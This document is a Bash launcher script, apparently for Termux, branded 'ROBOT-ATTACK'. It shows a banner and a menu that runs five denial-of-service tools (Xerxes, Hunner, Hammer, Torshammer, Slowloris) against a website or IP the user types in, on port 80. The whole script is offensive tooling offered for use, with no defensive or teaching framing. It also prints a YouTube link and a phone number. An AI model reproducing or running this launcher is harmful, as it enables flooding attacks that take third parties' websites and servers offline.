BY: ROBOT HACEKRS
red='\e[1;31m'
green='\e[1;32m'
blue='\e[1;34m'
purple='\e[1;35m'
cyan='\e[1;36m'
white='\e[1;37m'
yellow='\e[1;33m'
clear
printf """

$green    ██████╗  ██████╗ ██████╗  ██████╗ ████████╗
$green    ██╔══██╗██╔═══██╗██╔══██╗██╔═══██╗╚══██╔══╝
$green    ██████╔╝██║   ██║██████╔╝██║   ██║   ██║
$green    ██╔══██╗██║   ██║██╔══██╗██║   ██║   ██║
$green    ██║  ██║╚██████╔╝██████╔╝╚██████╔╝   ██║
$red    ╚═╝  ╚═╝ ╚═════╝ ╚═════╝  ╚═════╝    ╚═╝"""
echo ""
echo -e $yellow "            ($green BY :$red ROBOT HACEKRS$yellow )"
echo ""
echo ""
echo ""
echo -e $red 1- $blue XERXES
echo ""
echo -e $red 2- $blue HUNNER
echo ""
echo -e $red 3- $blue HAMMER
echo ""
echo -e $red 4- $blue TORSHAMMER
echo ""
echo -e $red 5- $blue SloWlORIS
echo ""
echo -e $red EXIT 00
echo ""
echo -e $purple
read -p "Enter The Number: " name
if [ $name = 00 ]
then
clear
figlet ABDULLHA
echo ""
echo -e $red    YOUTUBE :$blue "https://youtu.be/V2AvRlLLBe8"
echo ""
echo -e $red" WHATSAPP: $green  0096891284402"
echo ""
echo -e $green"         BY:ROBOT HACEKRS"
echo ""
echo -e $red"      Good Bye !!"
exit
fi
if [ $name = 1 ]
then
echo -e $green
read -p "Name Wab: " wab
cd /data/data/com.termux/files/home/ROBOT-ATTACK/.xerxes
clang xerxes.c -o xerxes
./xerxes $wab 80
fi
if [ $name = 2 ]
then 
echo -e $red
cd /data/data/com.termux/files/home/ROBOT-ATTACK/.Hunner
chmod 777 hunner.py
python hunner.py
fi
if [ $name = 3 ]
then
echo -e $red
read -p "IP : " ip
cd /data/data/com.termux/files/home/ROBOT-ATTACK/.hammer
chmod 777 hammer.py
python3 hammer.py -s $ip -p 80 -t 135
fi
if [ $name = 4 ]
then 
echo -e $red
read -p "IP : " ip
cd /data/data/com.termux/files/home/ROBOT-ATTACK/.torshammer
python2 torshammer.py -t $ip -r 256
fi
if [ $name = 5 ]
then 
echo -e $blue
read -p "IP : " ip
cd /data/data/com.termux/files/home/ROBOT-ATTACK/.slowloris
python3 slowloris.py $ip
fi
if [ $exit = ]
then 
bash ROBOT-ATTACK.sh
fi
